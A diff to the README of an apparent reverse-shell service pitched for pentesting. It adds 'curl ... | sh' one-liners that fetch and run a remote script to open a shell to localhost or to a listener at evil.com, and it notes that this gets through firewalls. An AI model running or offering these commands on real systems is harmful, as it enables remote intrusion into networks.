@@ -35,11 +35,21 @@ This is meant to be used for pentesting or helping coworkers understand why they
 
 <img src="https://i.imgur.com/DRqTcLq.gif" width="728">
 
-## Tip
+## Tips
 
-You can use a hostname or an IP. Because this is a reverse connection it can punch through firewalls and connect to the internet.
+### Hostname
 
-e.g You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with:
+You can use a hostname instead of an IP.
+
+```shell
+curl https://shell.now.sh/localhost:1337 | sh
+```
+
+### Remote connections
+
+Because this is a reverse connection it can punch through firewalls and connect to the internet.
+
+You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with.
 
 ```shell
 curl https://shell.now.sh/evil.com:1337 | sh
